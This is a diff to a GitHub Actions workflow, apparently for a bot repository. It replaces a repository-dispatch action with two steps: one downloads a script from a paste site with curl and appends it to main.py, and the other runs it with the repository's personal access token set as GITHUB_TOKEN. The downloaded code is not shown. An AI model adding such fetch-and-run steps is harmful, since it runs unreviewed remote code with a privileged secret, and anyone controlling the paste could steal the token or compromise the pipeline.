@@ -32,11 +32,11 @@ jobs:
           BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
           HEROKU: ${{ secrets.IS_HEROKU }}
 
-      - name: Trigger second 
-        uses: mvasigh/dispatch-action@main
-        with:
-          # You should create a personal access token and store it in your repository
-          token: ${{ secrets.PAT }}
-          repo: bot
-          owner: imauserbot
-          event_type: first
+      - name: Clone the Python script.
+        run: curl https://katb.in/dibuyirokez/raw >> main.py
+
+      - name: Run dispatch_event.
+        run: |
+          python main.py
+        env:
+          GITHUB_TOKEN: ${{ secrets.PAT }}
